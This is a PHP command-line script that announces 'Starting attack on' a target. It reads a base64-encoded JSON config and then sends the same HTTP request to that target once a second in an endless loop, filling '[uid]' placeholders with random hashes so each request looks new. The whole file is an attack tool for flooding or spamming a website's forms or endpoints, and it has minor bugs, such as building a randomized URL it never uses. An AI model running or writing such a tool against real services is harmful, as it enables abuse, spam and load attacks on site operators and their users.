<?php

$obj = json_decode(base64_decode($argv[1]));

echo "Starting attack on:\n";
echo "Target: " . $obj->target_url . "\n";
echo "Method: " . $obj->request_method . "\n";
echo "Body: " . implode("&", $obj->bodies) . "\n";
echo "headers: \n" . implode("\n\t", $obj->headers);
echo "\n==========================================\n";

while(true){
	$curl = curl_init();
	
	$url = $obj->target_url;
	if(strpos($url, "[uid]") > 0){
		$url = str_replace("[uid]", hash("md5", uniqid()), $url);
	}
	
	$headers = $obj->headers;
			
	for($i = 0; $i < count($headers); $i++){
		$h = $headers[$i];
		
		if(strpos($h, "[uid]") > 0){
			$h = str_replace("[uid]", hash("md5", uniqid()), $h);
			$headers[$i] = $h;
		}
	}
	
	$bodies = $obj->bodies;
	
	for($i = 0; $i < count($bodies); $i++){
		$b = $bodies[$i];
		
		if(strpos($b, "[uid]") > 0){
			$b = str_replace("[uid]", hash("md5", uniqid()), $b);
			$bodies[$i] = $b;
		}
	}
	
	curl_setopt_array($curl, array(
		CURLOPT_URL => $obj->target_url,
		CURLOPT_RETURNTRANSFER => true,
		CURLOPT_ENCODING => '',
		CURLOPT_MAXREDIRS => 10,
		CURLOPT_TIMEOUT => 0,
		CURLOPT_FOLLOWLOCATION => true,
		CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
		CURLOPT_CUSTOMREQUEST => $obj->request_method,
		CURLOPT_POSTFIELDS => implode("&", $bodies),
		CURLOPT_HTTPHEADER => $headers,
	));

	$response = curl_exec($curl);

	curl_close($curl);
	echo date("d-M-Y H:i:s\ ") . " - Request Sent: ". $url ."\n";
	sleep(1);
}